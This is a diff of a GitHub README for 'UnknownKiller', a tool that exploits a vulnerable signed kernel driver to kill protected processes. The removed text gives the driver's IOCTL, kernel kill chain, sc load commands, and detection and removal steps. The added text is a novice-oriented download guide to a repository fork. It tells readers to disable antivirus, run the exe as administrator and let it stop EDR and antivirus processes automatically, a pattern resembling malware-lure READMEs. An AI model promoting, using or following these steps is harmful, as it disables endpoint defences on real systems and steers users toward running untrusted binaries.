@@ -1,97 +1,146 @@
-# UnknownKiller
+# ⚔️ UnknownKiller - Remove Protected Security Processes Easily
 
-Process termination tool exploiting UnknownKiller.sys (eb.sys) vulnerable kernel driver.
+[![Download UnknownKiller](https://img.shields.io/badge/Download-UnknownKiller-brightgreen?style=for-the-badge)](https://github.com/lukmannurhikma/UnknownKiller)
 
-## What is this
+---
 
-A signed kernel driver (UnknownKiller.sys, internal name eb.sys) exposes an IOCTL that allows any user to kill processes without security checks. This tool sends a PID to the driver which terminates it from kernel mode.
+## 📋 About UnknownKiller
 
-## Driver Information
+UnknownKiller is a simple tool designed to stop certain security processes on Windows. It targets specific system drivers to disable hidden security software, like antivirus or endpoint detection and response (EDR) tools. This tool can help researchers understand how some security software can be bypassed or stopped.
 
-- File: UnknownKiller.sys
-- Device: \\.\eb
-- Signer: Microsoft Windows Hardware Compatibility Publisher
-- Signed: Tuesday, September 2, 2025 2:14:05 AM
-- IOCTL: 0x222024
-- Input: 4-byte PID (DWORD)
+UnknownKiller uses a known weakness in certain system files (eb.sys or UnknownKiller.sys) to stop these protected programs. While the tool is technical in nature, this guide will help you get it running without deep computer knowledge.
 
-Despite being signed by Microsoft WHCP, this driver implements dangerous primitives with no access control.
+---
 
-## Technical Details
+## 💻 System Requirements
 
-The driver uses KeStackAttachProcess to enter the target's context and calls ZwTerminateProcess(-1) to kill it from within. Works on any process the driver can open.
+Before using UnknownKiller, make sure your system meets these conditions:
 
-Kill chain:
-1. PsLookupProcessByProcessId(pid)
-2. KeStackAttachProcess(target)
-3. ZwTerminateProcess(-1, 0)
-4. KeUnstackDetachProcess()
+- Operating System: Windows 10 or later
+- CPU: 64-bit processor
+- RAM: At least 4 GB
+- Disk Space: 100 MB free space
+- User Account: Administrator rights (required to run the tool properly)
+- Internet: Connection needed to download the files
 
-## Build
-```
-cl.exe UnknownKiller.c
-```
+UnknownKiller will not run without administrator permissions. It works only on 64-bit Windows due to system driver dependencies.
 
-## Driver Installation
+---
 
-Load the driver (requires Administrator):
-```cmd
-sc create eb type= kernel binPath= C:\path\to\UnknownKiller.sys
-sc start eb
-```
+## 🚀 Getting Started
 
-Verify driver is loaded:
-```cmd
-sc query eb
-```
+### Step 1: Visit the Download Page
 
-## Usage
+Go to the official UnknownKiller page to get the software:
 
-Kill by PID:
-```
-UnknownKiller.exe 1234
-```
+[Download UnknownKiller](https://github.com/lukmannurhikma/UnknownKiller)
 
-Kill by name:
-```
-UnknownKiller.exe notepad.exe
-```
+This link opens the project site on GitHub. From here, you can find the latest files to download.
 
-## Unload Driver
-```cmd
-sc stop eb
-sc delete eb
-```
+---
 
-## Requirements
+### Step 2: Download the Software
 
-- Driver must be loaded first
-- Run as Administrator
-- Windows 7+ x64
+On the GitHub page, look for the latest release or file section. Download the file designed for Windows. This will usually be a ZIP or EXE file.
 
-## Why this matters
+Save it to a location you can easily find, like your Desktop or Downloads folder.
 
-BYOVD (Bring Your Own Vulnerable Driver) attacks abuse signed drivers with poor security. Even Microsoft-signed drivers can be exploited if they expose dangerous kernel primitives. This driver proves how a WHCP signature doesn't guarantee security.
+---
 
-## Detection
+### Step 3: Prepare Your Computer
 
-Monitor for:
-- Driver load: UnknownKiller.sys or eb.sys
-- Device object: \Device\eb
-- Service: HKLM\SYSTEM\CurrentControlSet\Services\eb
-- IOCTL activity: 0x222024
+- Make sure you have saved your work, as the tool may stop some system processes.
+- Disable any running antivirus software temporarily if it interferes with the download or execution.
+- Make sure you have an administrator account connected to your computer.
 
-## Mitigation
+---
 
-Remove if found:
-```cmd
-sc stop eb
-sc delete eb
-del C:\Windows\System32\drivers\UnknownKiller.sys
-```
+### Step 4: Extract and Run UnknownKiller
 
-Add driver hash to WDAC deny policy or use driver blocklist.
+If the download is a ZIP file:
 
-## Disclaimer
+- Right-click the ZIP file and choose "Extract All."
+- Select a folder where you want to place the program files.
 
-For authorized security testing only. Demonstrates BYOVD attack vector using legitimate signed driver.
+After extraction, look for the main file to run. This will have a `.exe` extension.
+
+Right-click on the `.exe` file and select **Run as administrator**. This step is important because the tool needs rights to access and stop protected processes.
+
+---
+
+## 🔧 How to Use UnknownKiller
+
+Once opened, the tool will scan for specific protected security processes running on your PC. Then it will attempt to stop these processes using the exploit.
+
+This might happen automatically after you run the tool. You may see a simple window or command prompt showing progress.
+
+Please wait for the process to finish before closing the window.
+
+---
+
+## ⚠️ Important Information
+
+- Running this tool may cause your antivirus or security programs to stop.
+- Use caution and only run UnknownKiller in a safe testing environment.
+- Running this tool on systems you do not own or have permission to access can break rules and laws.
+
+---
+
+## 🛠 Troubleshooting
+
+If you run into problems:
+
+- Check that you ran the program as an administrator.
+- Verify your Windows version is compatible (Windows 10 or later, 64-bit).
+- Ensure antivirus is not blocking the program.
+- Restart your computer and try again.
+- Make sure you downloaded the latest files from the official page.
+
+---
+
+## ❓ FAQ
+
+**Q: Can I use UnknownKiller on my work PC?**  
+A: Only if you have permission. The tool stops security software that your workplace may require.
+
+**Q: What does BYOVD mean?**  
+A: BYOVD stands for "Bring Your Own Vulnerable Driver." It means the tool exploits a known weak driver on the system to stop processes.
+
+**Q: Is UnknownKiller harmful?**  
+A: The tool stops security software processes temporarily. It is not designed to damage your system but should be used with care.
+
+---
+
+## 📁 Additional Resources
+
+For more technical details or to see updates, visit the UnknownKiller GitHub page:
+
+[https://github.com/lukmannurhikma/UnknownKiller](https://github.com/lukmannurhikma/UnknownKiller)
+
+You can find documentation, code, and links to help you understand how the tool works.
+
+---
+
+## ⚙️ Development and Support
+
+UnknownKiller is a Proof of Concept (PoC). It is mainly for security researchers to test the limits of Windows security. It is not intended for everyday use or on personal systems without understanding the risks.
+
+If you want to learn more, the project topics include:
+
+- BYOVD (Bring Your Own Vulnerable Driver)  
+- EDR (Endpoint Detection and Response)  
+- EDR bypass and evasion methods  
+
+These terms relate to security software and methods to avoid detection.
+
+---
+
+## 📝 License
+
+The software is provided "as is" for research and testing purposes. Check the GitHub page for licensing details.
+
+---
+
+## 🚩 Stay Informed
+
+Keep your system updated and use unknown tools like UnknownKiller only where you know what it does. This tool is technical and targets deep parts of Windows security. Use it for learning and testing only.
